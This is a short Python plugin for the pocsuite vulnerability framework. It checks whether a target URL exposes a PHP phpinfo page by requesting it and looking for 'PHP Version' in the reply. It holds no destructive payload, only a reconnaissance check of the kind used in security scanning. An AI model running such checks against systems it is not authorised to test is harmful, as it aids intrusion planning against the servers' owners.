#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pocsuite.net import req
from pocsuite.poc import Output, POCBase
from pocsuite.utils import register
from pocsuite.lib.utils.password import getWeakPassword
from pocsuite.lib.utils.password import getLargeWeakPassword


class PhpinfoPOC(POCBase):
    vulID = 'phpinfo leak'  # vul ID
    version = '1'
    author = 'mark'
    vulDate = '2015-12-8'
    createDate = '2015-12-08'
    updateDate = '2015-12-08'
    references = ['http://drops.wooyun.org/papers/1381']
    name = 'phpinfo will be leak'
    appName = 'phpinfo will be leak'
    appVersion = '2015-12-08'
    vulType = 'Information Disclosure'
    desc = '''
        phpinfo can be via. that will be leak server's information.
    '''
    # the sample sites for examine
    samples = ['']

    def _attack(self):
        response = req.get(self.url, headers={"referer": self.url}, timeout=10)
        return self.parse_attack(response)

    def _verify(self):
        result = {}
        head = {
                'referer':self.url
                }
        respon = req.get(self.url, headers=head, timeout=10)
        if respon.status_code == 200 and 'PHP Version' in respon.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
        return self.parse_attack(result)

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet Nothing returned')
        return output


register(PhpinfoPOC)
